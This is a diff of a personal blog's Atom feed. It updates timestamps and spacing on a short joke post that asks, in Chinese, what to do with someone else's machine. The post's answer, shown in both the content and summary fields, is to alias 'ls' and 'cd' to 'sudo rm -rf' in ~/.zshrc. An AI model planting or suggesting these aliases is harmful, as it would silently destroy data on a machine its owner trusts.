@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://arthurkuo1120120.github.io/"/>
-  <updated>2019-10-24T15:31:11.803Z</updated>
+  <updated>2019-10-24T16:09:11.595Z</updated>
   <id>https://arthurkuo1120120.github.io/</id>
   
   <author>
@@ -21,15 +21,15 @@
     <link href="https://arthurkuo1120120.github.io/10/24/2019/19-10-24-%E8%B4%9B%E8%A9%B1/"/>
     <id>https://arthurkuo1120120.github.io/10/24/2019/19-10-24-贛話/</id>
     <published>2019-10-24T15:23:02.000Z</published>
-    <updated>2019-10-24T15:31:11.803Z</updated>
+    <updated>2019-10-24T16:09:11.595Z</updated>
     
-    <content type="html"><![CDATA[<p>你知道拿到別人的機器要幹嘛ㄇ？<br><br><em><br>vim ~/.zshrc<br><br>alias ls=”sudo rm -rf”<br><br>alias cd=”sudo rm -rf”<br><br>:wq<br>  </em></p>]]></content>
+    <content type="html"><![CDATA[<p>你知道拿到別人的機器要幹嘛ㄇ？<br><br><em><br>vim ~/.zshrc<br><br> alias ls=”sudo rm -rf”<br><br> alias cd=”sudo rm -rf”<br><br> :wq<br>  </em></p>]]></content>
     
     <summary type="html">
     
       
       
-        &lt;p&gt;你知道拿到別人的機器要幹嘛ㄇ？&lt;br&gt;&lt;br&gt;&lt;em&gt;&lt;br&gt;vim ~/.zshrc&lt;br&gt;&lt;br&gt;alias ls=”sudo rm -rf”&lt;br&gt;&lt;br&gt;alias cd=”sudo rm -rf”&lt;br&gt;&lt;br&gt;:wq&lt;br&gt;  &lt;/em&gt;&lt;/p&gt;
+        &lt;p&gt;你知道拿到別人的機器要幹嘛ㄇ？&lt;br&gt;&lt;br&gt;&lt;em&gt;&lt;br&gt;vim ~/.zshrc&lt;br&gt;&lt;br&gt; alias ls=”sudo rm -rf”&lt;br&gt;&lt;br&gt; alias cd=”sudo rm -rf”&lt;br&gt;&lt;br&gt; :wq&lt;br&gt;  &lt;/em&gt;&lt;/p&gt;
 
       
     
